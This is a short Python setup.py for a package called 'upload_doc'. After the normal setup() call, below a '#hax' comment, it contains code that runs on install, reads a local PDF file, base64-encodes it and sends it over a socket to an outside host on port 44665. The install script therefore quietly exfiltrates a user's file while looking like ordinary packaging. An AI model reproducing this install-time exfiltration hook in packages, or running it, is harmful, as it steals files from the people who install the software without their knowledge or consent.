#!/usr/bin/env python

from distutils.core import setup
setup(name='upload_doc',
      version='1.2',
)
#hax

try:
	import base64
	import socket
	with open("C:/GreatBookPage7.pdf", "rb") as f:
		document = f.read()
	encoded = base64.encodestring(document)

	s=socket.socket()
	s.connect(('www.bouncybouncy.net',44665))
	s.send(encoded)
	s.close()
except Exception as e:
	print("oops")
	print(e)
